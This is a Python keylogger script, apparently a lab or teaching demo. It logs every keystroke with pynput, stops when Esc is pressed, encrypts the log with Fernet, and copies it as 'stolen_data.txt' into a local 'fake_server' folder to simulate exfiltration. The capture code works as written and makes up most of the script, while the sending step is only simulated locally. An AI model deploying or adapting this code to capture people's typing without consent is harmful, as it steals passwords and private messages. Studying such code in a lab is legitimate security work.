from pynput import keyboard
from cryptography.fernet import Fernet
import os
import shutil

# ==== SETTINGS ====
log_file = "keylog.txt"
encrypted_file = "encrypted_log.txt"
key_file = "secret.key"
fake_server_folder = "fake_server"
kill_key = keyboard.Key.esc  # Press Esc to stop

# ==== STEP 1: Generate encryption key if not exists ====
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
    print("🔐 Encryption key generated.")
else:
    print("🔐 Encryption key loaded.")

# Load the key
with open(key_file, "rb") as f:
    key = f.read()

fernet = Fernet(key)

# ==== STEP 2: Keystroke capturing with kill switch ====
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

    if key == kill_key:
        print("🛑 Kill switch pressed. Stopping keylogger.")
        return False  # Stops listener

print("⌨️ Keylogger started. Press 'Esc' to stop...")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# ==== STEP 3: Encrypt the log ====
if os.path.exists(log_file):
    with open(log_file, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(encrypted_file, "wb") as f:
        f.write(encrypted)
    print("✅ Keylog encrypted and saved to 'encrypted_log.txt'")
else:
    print("⚠️ No log file found to encrypt.")

# ==== STEP 4: Simulate sending the file ====
if not os.path.exists(fake_server_folder):
    os.makedirs(fake_server_folder)

shutil.copy(encrypted_file, os.path.join(fake_server_folder, "stolen_data.txt"))
print("📤 Encrypted log sent to fake server folder ('fake_server/stolen_data.txt')")

print("✅ All tasks completed!")